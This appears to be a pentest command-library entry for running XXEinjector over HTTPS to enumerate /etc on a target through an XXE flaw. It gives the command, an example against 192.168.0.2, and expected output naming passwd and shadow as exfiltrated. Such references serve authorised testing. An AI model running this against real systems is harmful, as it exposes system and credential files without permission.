---
id: unknown
name: xxeinjector-enumerate-etc-https
type: command
executor: bash
data: ruby XXEinjector.rb --host=$__HOST --path=/etc --file=/tmp/req.txt --ssl
output: null
created_at: '2023-04-06T03:56:43.973482+00:00'
updated_at: '2023-04-10T20:24:45.357412+00:00'
platforms:
  - Web
  - Linux
tags:
  - xxe
  - enumeration
  - https
verified: true
validated: true
---

# xxeinjector-enumerate-etc-https

## Command

```bash
ruby XXEinjector.rb --host=$__HOST --path=/etc --file=/tmp/req.txt --ssl
```

## Description

Enumerates files in the /etc directory on a target via HTTPS-enabled XXE injection using a prepared request file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $__HOST | Target host IP or domain | Yes |
| --path=/etc | Path to enumerate | Yes |
| --file=/tmp/req.txt | Path to vulnerable request file | Yes |
| --ssl | Enable HTTPS | Built-in |

## Examples

### Basic Usage

```bash
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
```

## Expected Output

List of /etc files: passwd, shadow, hosts, etc., exfiltrated via XXE.

## Related

- [[procedures/Exploit-XXE-Vulnerability-Using-Multiple-Tools]]
- [[tools/XXEinjector]]
